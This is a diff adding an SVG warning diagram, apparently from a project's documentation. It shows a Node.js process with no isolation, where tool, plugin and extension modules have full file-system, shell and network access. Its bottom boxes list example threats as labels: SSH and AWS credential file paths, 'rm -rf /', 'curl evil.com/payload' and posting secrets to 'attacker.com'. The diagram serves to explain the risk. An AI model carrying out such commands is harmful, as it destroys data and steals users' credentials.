@@ -1,0 +1,80 @@
+<svg viewBox="0 0 800 420" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <style>
+      .bg { fill: #0d1117; }
+      .danger-box { fill: none; stroke: #f85149; stroke-width: 3; }
+      .module-box { fill: #1f2937; stroke: #58a6ff; stroke-width: 2; }
+      .access-box { fill: #f8514933; stroke: #f85149; stroke-width: 1.5; }
+      .title-text { fill: #c9d1d9; font-family: Arial, sans-serif; font-size: 18px; font-weight: bold; }
+      .module-text { fill: #58a6ff; font-family: Arial, sans-serif; font-size: 14px; font-weight: 600; }
+      .access-text { fill: #f85149; font-family: Arial, sans-serif; font-size: 13px; font-weight: 600; }
+      .danger-text { fill: #f85149; font-family: Arial, sans-serif; font-size: 12px; }
+      .label-text { fill: #8b949e; font-family: Arial, sans-serif; font-size: 11px; }
+      .warning-text { fill: #f85149; font-family: Arial, sans-serif; font-size: 16px; font-weight: bold; }
+      .arrow { stroke: #f85149; stroke-width: 2; fill: none; marker-end: url(#arrowhead); }
+    </style>
+    <marker id="arrowhead" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+      <polygon points="0 0, 10 3, 0 6" fill="#f85149" />
+    </marker>
+  </defs>
+
+  <!-- Background -->
+  <rect class="bg" width="800" height="420"/>
+
+  <!-- Warning Header -->
+  <text class="warning-text" x="30" y="35">DANGER: No Isolation</text>
+  <circle cx="15" cy="28" r="8" fill="none" stroke="#f85149" stroke-width="2"/>
+  <text x="15" y="33" fill="#f85149" font-size="14" font-weight="bold" text-anchor="middle">!</text>
+
+  <!-- Main Process Container -->
+  <rect class="danger-box" x="50" y="60" width="700" height="200" rx="8"/>
+  <text class="title-text" x="70" y="85">Node.js Process (User Privileges)</text>
+
+  <!-- Module Boxes -->
+  <rect class="module-box" x="80" y="110" width="180" height="120" rx="6"/>
+  <text class="module-text" x="170" y="135" text-anchor="middle">Module 1</text>
+  <text class="label-text" x="170" y="155" text-anchor="middle">(Tools)</text>
+  <text class="label-text" x="170" y="190" text-anchor="middle">Full File System</text>
+  <text class="label-text" x="170" y="210" text-anchor="middle">Read/Write/Delete</text>
+
+  <rect class="module-box" x="310" y="110" width="180" height="120" rx="6"/>
+  <text class="module-text" x="400" y="135" text-anchor="middle">Module 2</text>
+  <text class="label-text" x="400" y="155" text-anchor="middle">(Plugins)</text>
+  <text class="label-text" x="400" y="190" text-anchor="middle">Shell Command</text>
+  <text class="label-text" x="400" y="210" text-anchor="middle">Execution</text>
+
+  <rect class="module-box" x="540" y="110" width="180" height="120" rx="6"/>
+  <text class="module-text" x="630" y="135" text-anchor="middle">Module N</text>
+  <text class="label-text" x="630" y="155" text-anchor="middle">(Extensions)</text>
+  <text class="module-text" x="630" y="180" text-anchor="middle">52+</text>
+  <text class="label-text" x="630" y="200" text-anchor="middle">Network Access</text>
+  <text class="label-text" x="630" y="220" text-anchor="middle">Outbound Requests</text>
+
+  <!-- Access Paths -->
+  <rect class="access-box" x="80" y="280" width="180" height="40" rx="4"/>
+  <text class="access-text" x="170" y="305" text-anchor="middle">Full FS Access</text>
+
+  <rect class="access-box" x="310" y="280" width="180" height="40" rx="4"/>
+  <text class="access-text" x="400" y="305" text-anchor="middle">Shell Exec</text>
+
+  <rect class="access-box" x="540" y="280" width="180" height="40" rx="4"/>
+  <text class="access-text" x="630" y="305" text-anchor="middle">Network I/O</text>
+
+  <!-- Arrows from Access Paths to Dangers -->
+  <line class="arrow" x1="170" y1="320" x2="170" y2="355"/>
+  <line class="arrow" x1="400" y1="320" x2="400" y2="355"/>
+  <line class="arrow" x1="630" y1="320" x2="630" y2="355"/>
+
+  <!-- Danger Targets -->
+  <rect fill="#1a1d24" stroke="#f85149" stroke-width="1" x="60" y="365" width="220" height="40" rx="4"/>
+  <text class="danger-text" x="170" y="382" text-anchor="middle">~/.ssh/id_rsa</text>
+  <text class="danger-text" x="170" y="398" text-anchor="middle">~/.aws/credentials</text>
+
+  <rect fill="#1a1d24" stroke="#f85149" stroke-width="1" x="290" y="365" width="220" height="40" rx="4"/>
+  <text class="danger-text" x="400" y="382" text-anchor="middle">rm -rf /</text>
+  <text class="danger-text" x="400" y="398" text-anchor="middle">curl evil.com/payload</text>
+
+  <rect fill="#1a1d24" stroke="#f85149" stroke-width="1" x="520" y="365" width="220" height="40" rx="4"/>
+  <text class="danger-text" x="630" y="382" text-anchor="middle">POST secrets</text>
+  <text class="danger-text" x="630" y="398" text-anchor="middle">to attacker.com</text>
+</svg>
